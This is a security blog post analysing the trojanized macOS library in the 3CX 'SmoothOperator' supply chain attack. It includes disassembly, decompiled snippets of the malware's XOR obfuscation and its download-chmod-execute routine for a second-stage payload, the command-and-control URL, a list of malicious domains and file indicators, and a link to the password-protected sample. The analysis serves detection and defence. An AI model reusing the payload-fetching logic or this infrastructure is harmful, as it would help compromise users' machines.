<html xmlns="http://www.w3.org/1999/xhtml" xmlns:og="http://ogp.me/ns#">
  
  <head>

    <meta charset="UTF-8">
    <title>Objective-See's Blog</title>
    
    <link rel="shortcut icon" href="../images/logoApple.ico">
    
    
    <link href="/css/style.css" rel="stylesheet" />
    <link href="/css/menu.css" rel="stylesheet" />

    
    <script src="/js/analytics.js"></script>
    <script src="/js/sweetalert.min.js"></script>
    <script src="/js/donationPopup.js"></script>
    <script src="/js/cookies.js"></script>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    
    <script type="text/javascript" src="//s3.amazonaws.com/downloads.mailchimp.com/js/signup-forms/popup/embed.js" data-dojo-config="usePlainJson: true, isDebug: false"></script>

    <script type="text/javascript">require(["mojo/signup-forms/Loader"], function(L) { L.start({"baseUrl":"mc.us13.list-manage.com","uuid":"ecee7516f567e712084cdb1d0","lid":"5fae6de946"}) })</script>

  
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:site" content="@objective_see" />
<meta name="twitter:image" content=https://objective-see.org/images/blog/blog_0x73/app.png />
<meta name="twitter:title" content=Ironing&#32;out&#32;(the&#32;macOS)&#32;details&#32;of&#32;a&#32;Smooth&#32;Operator&#32;(Part&#32;I) />
<meta name="twitter:description" content=The&#32;3CX&#32;supply&#32;chain&#32;attack,&#32;gives&#32;us&#32;an&#32;opportunity&#32;to&#32;analyze&#32;a&#32;trojanized&#32;macOS&#32;application />
    
<meta property="og:type" content="article" />
<meta property="og:title" content=Ironing&#32;out&#32;(the&#32;macOS)&#32;details&#32;of&#32;a&#32;Smooth&#32;Operator&#32;(Part&#32;I) />
<meta property="og:image" content=https://objective-see.org/images/blog/blog_0x73/app.png />


  </head>

  <body>

    
<script async src="https://www.googletagmanager.com/gtag/js?id=G-ZLBT2WB789"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-ZLBT2WB789');
</script>

<link rel="stylesheet" type="text/css" href="/css/menu.css">

<meta http-equiv="cache-control" content="max-age=0" />
<meta http-equiv="cache-control" content="no-cache" />
<meta http-equiv="expires" content="0" />
<meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
<meta http-equiv="pragma" content="no-cache" />

<nav role="main" style="padding-bottom:30px;">
<ul>
    
    <li>
    <div class="logo">
        <a href="/index.html">
            <figure class="logo">
                <img src="/images/logoApple.png" style="height:75px; width:75px;" />
                <br>
                <figcaption class="logo">
                    <span style="color: #95c02d;">Objective</span><span style="color: #798992;">-See</span>
                 
                    <div style="color: #798992; font-size: 18px; font-weight: 300; padding-left: 3px; margin-top: -2px;">
                     a non-profit 501(c)(3) foundation.
                    </div>
                
                </figcaption>
            </figure>
        </a>
    </div>
    </li>

    
    <li>  
        <div class="menuicon">
        <div style="position: relative; min-width:0px;">
        <input type="checkbox" class="toggler">
        <div class="hamburger"><div></div></div>
        <div class="menu">
        <div style="padding-right: 20px;">
            <ul>

                <li>
                    <a href="/about.html" style="display:block;">
                        <img style="vertical-align:middle" src="/images/aboutIcon.png" height="24px;">
                        <span style="vertical-align:middle">About</span>
                    </a>
                </li>

                <li>
                    <a href="https://objectivebythesea.org/" target="_blank" style="display:block;">
                        <img style="vertical-align:middle" src="/images/conferenceIcon.png" height="24px;">
                        <span style="vertical-align:middle">#OBTS</span>
                    </a>
                </li>

                <li>
                    <a href="https://taomm.org/" target="_blank" style="display:block;">
                        <img style="vertical-align:middle" src="/images/bookIcon.png" height="24px;">
                        <span style="vertical-align:middle">Book Series</span>
                    </a>
                </li>

                <li>
                    <a href="/we.html" style="display:block;">
                        <img style="vertical-align:middle" src="/images/weIcon.png" height="24px;">
                        <span style="vertical-align:middle">Objective-We</span>
                    </a>
                </li>

                <li>
                    <a href="https://objective-see.myshopify.com/" target="_blank" style="display:block;">
                        <img style="vertical-align:middle" src="/images/storeIcon.png" height="24px;">
                        <span style="vertical-align:middle">Our Store/Swag</span>
                    </a>
                </li>

                <li style="border-bottom: none;">
                    <a href="/malware.html" style="display:block;">
                        <img style="vertical-align:middle" src="/images/malwareIcon.png" height="24px;">
                        <span style="vertical-align:middle">Malware Collection</span>
                    </a>
                </li>

                

            </ul>
        </div>
    </div>
    </div>
    </div>

    </li>

    
    <li>
        <form action="/support.html" style="display: inline;">
            <button class="menuicon button-4" role="button">Support Us!</button>
        </form>
    </li>

    
    <li>
        <a href="/blog.html" class="menuicon">
        <figure class="item">
            <center>
                <img src="/images/blogIcon.png" class="item"/>
                <figcaption class="item">blog</figcaption>
            </center>
        </figure>
        </a>
    </li>
    
    
    <li>
        <a href="/tools.html" class="menuicon">
        <figure class="item">
            <center>
                <img src="/images/productsIcon.png" class="item"/>
            </center>
            <figcaption class="item">tools</figcaption>
        </figure>
        </a>
    </li>

</ul>

<hr class="gradient">

</nav>
    
    
    <div class="pageContent">
      
<section class="blogContent" style="padding-bottom:50px";>
  <div class="blogTitle">Ironing out (the macOS) details of a Smooth Operator (Part I)</div>
  <div class="blogSubTitle">The 3CX supply chain attack, gives us an opportunity to analyze a trojanized macOS application</div>
  <div class="blogDate" style="padding-top:10px;">by: Patrick Wardle / March 29, 2023</div>
  <link rel="shortcut icon" href="../images/logoApple.ico">
<link rel="stylesheet" type="text/css" href="../css/style.css">
<link href="../css/ss-social.css" rel="stylesheet" />
<link href="../css/ss-standard.css" rel="stylesheet" />
<script src="../js/analytics.js"></script>
<script src="../js/sweetalert.min.js"></script>
<script src="../js/donationPopup.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.2/jquery.min.js"></script>
<style type="text/css">
@media print { body { -webkit-print-color-adjust: exact; } }
</style>
<div style="border: 1px solid #95c02d; padding: 10px; margin-top:15px; border-radius: 10px;">
    <div style="text-align: left; padding-bottom: 10px;">Objective-See's research, tools, and writing, are supported by the "Friends of Objective-See" such as:</div>
    <center>
        <div class="logo-link">
            <a href="https://www.jamf.com/?utm_source=objective-see&utm_medium=sponsored-link&utm_campaign=next-gen-security&utm_content=2021-02-05_protect" style="border: 0px;" target="_blank">
                <img src="/images/friends/textless/jamf.png" height="64px;">
                <br>
                <div class="logo-title">Jamf</div>
            </a>
        </div>
        <div class="logo-link">
            <a href="https://l.linklyhq.com/l/18wF2" style="border: 0px;" target="_blank">
                <img src="/images/friends/textless/mosyle.png" height="66px;">
                <br>
                <div class="logo-title">Mosyle</div>
            </a>
        </div>
        <div class="logo-link" style="">
            <a href="https://www.kandji.io" style="border: 0px;" target="_blank">
                <img src="/images/friends/textless/kandji.png" height="64px;">
                <br>
                <div class="logo-title">Kandji</div>
            </a>
        </div>
        <div class="logo-link" style="">
            <a href="https://macpaw.com/cleanmymac" style="border: 0px;" target="_blank">
                <img src="/images/friends/textless/cmm.png" height="64px;">
                <br>
                <div class="logo-title">CleanMyMac X</div>
            </a>
        </div>
        <div class="logo-link" style="">
            <a href="https://l.kolide.co/Objective-See" style="border: 0px;" target="_blank">
                <img src="/images/friends/textless/kolide.png" height="66px;">
                <br>
                <div class="logo-title">Kolide</div>
            </a>
        </div>
        <div class="logo-link" style="">
        <a href="https://fleetdm.com" style="border: 0px;" target="_blank">
            <img src="/images/friends/textless/fleetdm.png" height="64px;">
        <div class="logo-title">Fleet</div>
        </a>
        </div>
        <div class="logo-link" style="">
        <a href="https://www.paloaltonetworks.com" style="border: 0px;" target="_blank">
            <img src="/images/friends/textless/panw.png" height="64px;">
        <div class="logo-title">Palo Alto Networks</div>
        </a>
        </div>
        <div class="logo-link" style="">
        <a href="https://www.sophos.com" style="border: 0px;" target="_blank">
            <img src="/images/friends/textless/sophos.png" height="64px;">
        <div class="logo-title">Sophos</div>
        </a>
        </div>
    </center>
</div>
<br>
<br>
<div class="note">
&#x1F4DD; &#x1F47E; Want to play along?
<p>As &ldquo;Sharing is Caring&rdquo; I&rsquo;ve uploaded the malicious dynamic library <a href="https://github.com/objective-see/Malware/raw/main/SmoothOperator.zip">libffmpeg.dylib</a> to our public macOS malware collection. The password is: infect3d</p>
<div align="right" style="padding-right:10px; padding-bottom:10px;">
...please though, don't infect yourself! 
</div>
</div>
<br>
<h3 id="background">Background</h3>
<p>Earlier today, several vendors uncovered a massive supply chain attack, spreading malware dubbed SmoothOperator:</p>
<center>
    <blockquote class="twitter-tweet"><p lang="en" dir="ltr">Earlier today <a href="https://twitter.com/CrowdStrike?ref_src=twsrc%5Etfw">@CrowdStrike</a> reported a supply chain attack targeting the 3CX Voice Over Internet Protocol (VOIP) Windows desktop client.<br><br>- 600,000 companies use it<br>- 12,000,000 users<br>- <a href="https://twitter.com/Sophos?ref_src=twsrc%5Etfw">@Sophos</a> has identified a MacOS variant infected<br>- Currently attributed to Lazarus Group</p>&mdash; vx-underground (@vxunderground) <a href="https://twitter.com/vxunderground/status/1641249699746267138?ref_src=twsrc%5Etfw">March 30, 2023</a></blockquote>
    <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

</center>
<p>For details on the supply chain attack, affecting 3CX, you can read the following:</p>
<ul>
<li>
<p><a href="https://www.crowdstrike.com/blog/crowdstrike-detects-and-prevents-active-intrusion-campaign-targeting-3cxdesktopapp-customers/">&ldquo;CrowdStrike Falcon Platform Detects and Prevents Active Intrusion Campaign Targeting 3CXDesktopApp Customers&rdquo;</a></p>
</li>
<li>
<p><a href="https://www.sentinelone.com/blog/smoothoperator-ongoing-campaign-trojanizes-3cx-software-in-software-supply-chain-attack/">&ldquo;SmoothOperator | Ongoing Campaign Trojanizes 3CXDesktopApp in Supply Chain Attack&rdquo;</a></p>
</li>
<li>
<p><a href="https://news.sophos.com/en-us/2023/03/29/3cx-dll-sideloading-attack/">&ldquo;3CX users under DLL-sideloading attack: What you need to know&rdquo;</a></p>
</li>
</ul>
<p>While these analyses were a great start, they all were missing one very important piece! Details on the macoS infection and the specific malicious component(s).</p>
<p>Specifically, though the reports noted 3CX&rsquo;s macOS application may have been trojanized this was not conclusively confirmed, with one vendor noting, &ldquo;at this time, we cannot confirm that the Mac installer is similarly trojanized&rdquo;.</p>
<p>&hellip;sounds like its up to us to get to the bottom on this!</p>
<h3 id="triage">Triage</h3>
<p>The <a href="https://www.crowdstrike.com/blog/crowdstrike-detects-and-prevents-active-intrusion-campaign-targeting-3cxdesktopapp-customers/">CrowdStrike report</a> noted that they had seen malicious macOS activity emanating from 3CX&rsquo;s macOS application &hellip;and were kind enough to provide a name and hash of a disk image they believed was infected. This was the key to starting our investigation, so a big thanks to them!</p>
<p>We&rsquo;ll start with this disk image, 3CXDesktopApp-18.12.416.dmg (<code>SHA-1: 3DC840D32CE86CEBF657B17CEF62814646BA8E98</code>):</p>
<img src="../images/blog/blog_0x73/dmg.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">Trojanized Disk Image?</center>

<p>As you can see, it contains a single application, named &ldquo;3CX Desktop App&rdquo;.</p>
<p>If we check its code-signing information, we can see not only is it validly signed by the 3CX developer, but also <strong>notarized</strong> by Apple! The latter means Apple checked it for malware &ldquo;and none was detected&rdquo; &hellip;yikes!</p>
<img src="../images/blog/blog_0x73/app.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">Trojanized Application</center>

<br>
<br>
<div class="note">
Notarization means the application will be allowed to run on recent versions of macOS, with the OS not blocking it. 
<p>Update: Apple has now revoked the code-signing certifiate, meaning the item&rsquo;s notarization is rescinded.</p>
</div>
<p>&hellip;at this point, if I&rsquo;m being honest, the thought crossed my mind that maybe the reason none of the vendors (with their millions of dollars and large malware analysis teams) hadn&rsquo;t detailed the macOS trojanization mechanism was because there wasn&rsquo;t one? I mean, Apple had notarized the application, which in a way is giving it their sample of approval.</p>
<p>I brushed this thought aside and kept digging &hellip;which as the application was almost 400mb, was no trivial task.</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
% du -h /Volumes/3CXDesktopApp-18.12.416/3CX\ Desktop\ App.app
...

381M    /Volumes/3CXDesktopApp-18.12.416/3CX Desktop App.app

</pre>
</div>
<p>I (eventually) came across a binary named <code>libffmpeg.dylib</code>
buried deep within the App&rsquo;s <code>Contents/Frameworks/Electron\ Framework.framework/Versions/A/Libraries</code> directory.</p>
<p>Its <code>SHA-1</code> hash is <code>769383fc65d1386dd141c960c9970114547da0c2</code>, and it was <a href="https://www.virustotal.com/gui/file/a64fa9f1c76457ecc58402142a8728ce34ccba378c17318b3340083eeb7acc67">uploaded to VirusTotal</a> early today where it was not flagged by any of the AV engines as being malicious:</p>
<img src="../images/blog/blog_0x73/dylib.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">A malicious dynamic library?</center>

<p>Using the file command, we see it&rsquo;s a Mach-O universal binary with 2 architectures: x86_64 &amp; arm64:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
% file 3CX\ Desktop\ App.app/Contents/Frameworks/Electron\ Framework.framework/Versions/A/Libraries/libffmpeg.dylib 

libffmpeg.dylib: Mach-O universal binary with 2 architectures: [x86_64:Mach-O 64-bit dynamically linked shared library x86_64] [arm64]

libffmpeg.dylib:   Mach-O 64-bit dynamically linked shared library x86_64
libffmpeg.dylib:   Mach-O 64-bit dynamically linked shared library arm64

</pre>
</div>
<p>A quick triage of this binary revealed XOR loops, timing checks, dynamically resolved APIs, and string obfuscations &hellip;all shady! 👀</p>
<p>Time to dig deeper!</p>
<h3 id="analysis-of-libffmpegdylib">Analysis of <code>libffmpeg.dylib</code></h3>
<p>In this section we&rsquo;ll analyze the malicious logic of the <code>libffmpeg.dylib</code> binary. We&rsquo;ll focus on the Intel (<code>x86_64</code>) versions as the Arm version doesn&rsquo;t appear to be infected!</p>
<div class="note">
Worth noting that the Intel version can still run on Apple Silicon sytems, if Rosetta is installed.
</div>
<p>At the start of the Intel version, a thread is spawned via a function called <code>run_avcodec</code>
This kicks off a (thread) function at 0x48430:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-nasm" data-lang="nasm"><span style="display:flex;"><span>EntryPoint:
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x000000000004b180</span>        xor        eax, eax                   
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x000000000004b182</span>        jmp        _run_avcodec 
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">...</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>_run_avcodec:
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0000000000048400</span>         push       rax 
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0000000000048401</span>         movabs     rax, <span style="color:#ae81ff">0xaaaaaaaaaaaaaaaa</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x000000000004840b</span>         mov        rdi, rsp
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x000000000004840e</span>         mov        <span style="color:#66d9ef">qword</span> [rdi], rax
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0000000000048411</span>         lea        rdx, <span style="color:#66d9ef">qword</span> [sub_48430]
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0000000000048418</span>         xor        esi, esi                                
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x000000000004841a</span>         xor        ecx, ecx
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x000000000004841c</span>         call       imp___stubs__pthread_create 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">...</span></span></span></code></pre></div>
<p>The function at <code>0x48430</code> (named <code>sub_48430</code> in the disassembly) is where things get interesting!</p>
<p>A quick triage of this function shows that its rather massive but more importantly contains various anti-analysis approaches aimed at thwarting static analysis. For example here is a snippet of decompilation showing a string begin de-XOR&rsquo;d:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">do</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int8_t</span> <span style="color:#f92672">*</span>)(rsp <span style="color:#f92672">+</span> rax <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1b40</span>) <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int8_t</span> <span style="color:#f92672">*</span>)(rsp <span style="color:#f92672">+</span> rax <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1b40</span>) <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x7a</span>;
</span></span><span style="display:flex;"><span>    rax <span style="color:#f92672">=</span> rax <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1</span>;
</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">while</span> (rax <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x32</span>);</span></span></code></pre></div>
<p>Clearly, it is not trivial to understand this solely via static analysis, so let&rsquo;s leverage dynamic analysis (read: use a debugger).</p>
<p>Debugging a dynamic library is a bit tricky, as it can&rsquo;t be executed in a standalone manner. Not to worry, we can whip up a simple loader that will load it (or any passed in dylib) via the <code>dlopen</code> API:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#75715e">#import &lt;dlfcn.h&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#import &lt;Foundation/Foundation.h&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> argv[]) {
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span> handle <span style="color:#f92672">=</span> dlopen(argv[<span style="color:#ae81ff">1</span>], RTLD_LOCAL <span style="color:#f92672">|</span> RTLD_LAZY);
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    dispatch_main();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
<p>Once this is compiled (as an <code>x86_64</code> program, as we want to debug the <code>x86_64</code> version of <code>libffmpeg.dylib</code>), we launch it via the <code>lldb</code> debugger:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">

% lldb dlopen_x64 libffmpeg.dylib 

</pre>
</div>
<p>We can then run the loader (<code>dlopen_x64</code>) via a debugger passing in the malicious dylib <code>libffmpeg.dylib</code>.</p>
<p>Setting a breakpoint on <code>pthread_create</code> allows the debugger to break right before the thread function of interest to us, is executed. This is important as we don&rsquo;t know exactly where the library will be loaded in memory (and thus can&rsquo;t initially set a breakpoint on the address of the thread function).</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">

% lldb dlopen_x64 libffmpeg.dylib 
...

(lldb) b pthread_create
(lldb) run

Process 21118 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
    frame #0: 0x00007ff81c81c445 libsystem_pthread.dylib`pthread_create
libsystem_pthread.dylib`pthread_create:
->  0x7ff81c81c445 <+0>: xorl   %r8d, %r8d
    
</pre>
</div>
<p>Once broken we can use the <code>image list</code> debugger command to find the address that the <code>libffmpeg.dylib</code> library is loaded, and from this, the address of the thread function. Then, we can set a breakpoint such the debugger will break once its about to be executed.</p>
<p>Hooray, now we&rsquo;re in the debugger at the start of the thread function &hellip;let&rsquo;s start stepping through it. We won&rsquo;t go through all its details, but instead highlight, well, highlights!</p>
<p>First, it de-XORs components to build the following path: <code>~/Library/Application Support/3CX Desktop App/.session-lock</code>. It then attempts to open this file via the <code>open</code> API. (In the debugger the <code>RDI</code> register will hold the first argument (the file name) passed to <code>open</code>):</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
Target 0: (dlopen_x64) stopped.
(lldb) x/s 0x3041946f0
0x3041946f0: "%s/Library/Application Support/3CX Desktop App/%s"

...

libffmpeg.dylib`___lldb_unnamed_symbol1736:
->  0x10a0484f5 <+341>: callq  0x10a208858               ; symbol stub for: open

Target 0: (dlopen_x64) stopped.
(lldb) x/s $rdi
0x304193ee0: "/Users/patrick/Library/Application Support/3CX Desktop App/.session-lock"
</pre>
</div>
<p>If this file does not exist the function will exit (so we&rsquo;ll create a blank file here, so we can keep debugging).</p>
<p>The function then executes logic to query the host to get the OS version, computer name, etc, etc. On my machine (macOS 13.3), once it has gathered this information and concatenated it together it looks something like this: <code>&quot;13.3;Patricks-MacBook-Pro.local;6180;14&quot;</code>.</p>
<p>It then generates a unique identifier (UUID) and write this out to a file named <code>.main_storage</code> also in the <code>~/Library/Application Support/3CX Desktop App/</code> directory:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
% hexdump -C ~/Library/Application Support/3CX Desktop App/.main_storage
00000000  49 4d 48 4f 1f 42 4b 1f  57 4a 4f 4b 43 57 4d 1c  |IMHO.BK.WJOKCWM.|
00000010  4a 43 57 4d 48 1b 19 57  49 4f 4c 4e 4b 19 43 4e  |JCWMH..WIOLNK.CN|
00000020  19 4b 19 1c 7a 7a 7a 7a  7a 7a 7a 7a 7a 7a 7a 7a  |.K..zzzzzzzzzzzz|
00000030  5e b8 46 1e 7a 7a 7a 7a                           |^.F.zzzz|
</pre>
</div>
<p>This file is &ldquo;encrypted&rdquo; with the XOR key <code>0x7a</code>.</p>
<p>After various anti-debugging logic (e.g. timing checks) it builds a URL to query. We can easily dump this in the debugger to reveal that it is <code>https://pbxsources.com/queue</code>:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
...
Process 18702 stopped

(lldb) po $rax
https://pbxsources.com/queue

</pre>
</div>
<br>
<br>
<div class="note">
The domain pbxsources.com is listed by various vendors as an IoC to detect the Windows variant of this malware. 
<p>It&rsquo;s not surprising the macOS variant used the same network infrastructure.</p>
</div>
<p>After setting a static user-agent (<code>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.128 Safari/537.36</code>) and adding various host info as HTTP headers, it connects out to the decrypted URL.</p>
<p>Unfortunately the URL the malware is trying to reach (pbxsources.com) is now offline:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">

% nslookup pbxsources.com
Server:     1.1.1.1
Address:    1.1.1.1#53

** server can't find pbxsources.com: NXDOMAIN

</pre>
</div>
<p>&hellip;so the malware doesn&rsquo;t get the <code>HTTP 200 OK</code> it wants, and thus goes off to snooze.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>rax <span style="color:#f92672">=</span> strcmp(var_23F8, <span style="color:#e6db74">&#34;200&#34;</span>); 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span><span style="color:#75715e">//no match?
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">do</span> {
</span></span><span style="display:flex;"><span>        time(rbp);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#ae81ff">0x0</span> <span style="color:#f92672">&gt;=</span> r14) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        sleep(<span style="color:#ae81ff">0xa</span>);
</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">while</span> (true);</span></span></code></pre></div>
<p>As the C&amp;C server is offline, our dynamic analysis comes to an end. But that&rsquo;s ok! Continued static analysis appears to show the malware expects to download a 2<sup>nd</sup>-stage payload. This appears to be saved as a file named <code>UpdateAgent</code> (in the Application Support/3CX Desktop App/ directory)</p>
<p>In the annotated decompilation, you can see that once the file is written out, the malware sets it to be executable (via <code>chmod</code>), then executes it via the <code>popen</code> API:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#75715e">//write out 2nd-stage payload
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// path (likely): &#34;UpdateAgent&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>rax <span style="color:#f92672">=</span> fopen<span style="color:#960050;background-color:#1e0010">$</span>DARWIN_EXTSN(r13, <span style="color:#e6db74">&#34;wb&#34;</span>);
</span></span><span style="display:flex;"><span>fwrite(var_23F8 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x4</span>, <span style="color:#ae81ff">0xfffffffffffffffc</span>, <span style="color:#ae81ff">0x1</span>, rax);
</span></span><span style="display:flex;"><span>fflush(rax);
</span></span><span style="display:flex;"><span>fclose(rax);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">//make +x 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>chmod(r13, <span style="color:#ae81ff">0x1ed</span>);
</span></span><span style="display:flex;"><span>            
</span></span><span style="display:flex;"><span><span style="color:#75715e">//add &#34;&#34;&gt; /dev/null&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>sprintf(r12, rbp);
</span></span><span style="display:flex;"><span>popen<span style="color:#960050;background-color:#1e0010">$</span>DARWIN_EXTSN(r12, <span style="color:#e6db74">&#34;r&#34;</span>);</span></span></code></pre></div>
<p>I don&rsquo;t have access to this binary, what it does is a mystery.</p>
<h3 id="detection">Detection</h3>
<p>Let&rsquo;s end by talking how to detect the macOS variant of the SmoothOperator malware.</p>
<p>First some IoCs (with the caveat that I don&rsquo;t know what &ldquo;3CX Desktop App.app&rdquo; normally does, but as we saw, the malicious library, <code>libffmpeg.dylib</code>, interacts w/ the following files)</p>
<p>File based IoCs (found in <code>~/Library/Application Support/3CX Desktop App/</code>)</p>
<ul>
<li><code>UpdateAgent</code></li>
<li><code>.main_storage</code></li>
<li><code>.session-lock</code></li>
</ul>
<p>In terms of domains the malware will attempt to connect to, we can, as noted by Snorre Fagerland on Twitter, simply de-XOR the entire <code>libffmpeg.dylib</code> binary with the key <code>0x7a</code> to recover a comprehensive list</p>
<center>
    <blockquote class="twitter-tweet"><p lang="en" dir="ltr">Thanks for this! Concur on the xor - if people want a whole heap of indicators, just xor the entire file with 0x7a and see what falls out. <a href="https://t.co/XNMfDyYr1I">pic.twitter.com/XNMfDyYr1I</a></p>&mdash; Snorre Fagerland (@fstenv) <a href="https://twitter.com/fstenv/status/1641339337152385025?ref_src=twsrc%5Etfw">March 30, 2023</a></blockquote>
    <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

</center> 
<p>Embedded Domains:</p>
<ul>
<li><code>officestoragebox.com/api/biosync</code></li>
<li><code>visualstudiofactory.com/groupcore</code></li>
<li><code>azuredeploystore.com/cloud/images</code></li>
<li><code>msstorageboxes.com/xbox</code></li>
<li><code>officeaddons.com/quality</code></li>
<li><code>sourceslabs.com/status</code></li>
<li><code>zacharryblogs.com/xmlquery</code></li>
<li><code>pbxcloudeservices.com/network</code></li>
<li><code>pbxphonenetwork.com/phone</code></li>
<li><code>akamaitechcloudservices.com/v2/fileapi</code></li>
<li><code>azureonlinestorage.com/google/storage</code></li>
<li><code>msedgepackageinfo.com/ms-webview</code></li>
<li><code>glcloudservice.com/v1/status</code></li>
<li><code>pbxsources.com/queue</code></li>
<li><code>www.3cx.com/blog/event-trainings/</code></li>
</ul>
<p>This list of URLs appear to be same as Window variant.</p>
<h3 id="conclusion">Conclusion</h3>
<p>Today we added a missing puzzle piece to the 3CX supply chain attack. Here, for the first time we uncovered the trojanization component of the macOS component! Moreover, we thoroughly analyzed this component, while providing IoCs for detection.</p>
<p>Now I&rsquo;m off to hunt for that 2<sup>nd</sup>-stage payload (and to sleep) Y&rsquo;all stay safe!</p>
<div class="note">
Update, I was able to get my hands on a 2<sup>nd</sup>-stage payload, and have now published a new blog on it. 
<br>
